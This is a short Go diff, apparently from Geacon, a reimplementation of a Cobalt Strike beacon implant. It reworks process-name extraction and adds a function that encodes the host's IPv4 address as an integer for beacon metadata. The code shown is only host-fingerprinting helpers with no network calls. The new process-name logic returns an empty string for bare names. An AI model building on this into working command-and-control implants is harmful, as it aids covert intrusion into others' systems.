@@ -28,10 +28,22 @@ func GeaconID() int {
 
 func GetProcessName() string {
 	processName := os.Args[0]
-	if len(processName) > 10 {
-		processName = processName[len(processName)-9:]
+	var result string
+	// C:\Users\admin\Desktop\cmd.exe
+	// ./cmd
+	slashPos := strings.LastIndex(processName, "\\")
+	if slashPos > 0 {
+		result = processName[slashPos+1:]
 	}
-	return strings.ReplaceAll(strings.ReplaceAll(processName, "./", ""), "/", "")
+	backslashPos := strings.LastIndex(processName, "/")
+	if backslashPos > 0 {
+		result = processName[backslashPos+1:]
+	}
+	// stupid length limit
+	if len(result) > 10 {
+		result = result[len(result)-9:]
+	}
+	return result
 }
 
 func GetPID() int {
@@ -76,12 +88,26 @@ func GetLocalIP() string {
 	}
 	for _, address := range addrs {
 		if ipnet, ok := address.(*net.IPNet); ok && !ipnet.IP.IsLoopback() && !strings.HasPrefix(ipnet.IP.String(), "169.254") && ipnet.IP.To4() != nil {
-			if ipnet.IP.To4() != nil {
-				return ipnet.IP.String()
-			}
+			return ipnet.IP.String()
 		}
 	}
 	return ""
+}
+
+func GetLocalIPInt() uint32 {
+	addrs, err := net.InterfaceAddrs()
+	if err != nil {
+		return 0
+	}
+	for _, address := range addrs {
+		if ipnet, ok := address.(*net.IPNet); ok && !ipnet.IP.IsLoopback() && !strings.HasPrefix(ipnet.IP.String(), "169.254") && ipnet.IP.To4() != nil {
+			if len(ipnet.IP) == 16 {
+				return binary.LittleEndian.Uint32(ipnet.IP[12:16])
+			}
+			return binary.LittleEndian.Uint32(ipnet.IP)
+		}
+	}
+	return 0
 }
 
 func GetMagicHead() []byte {
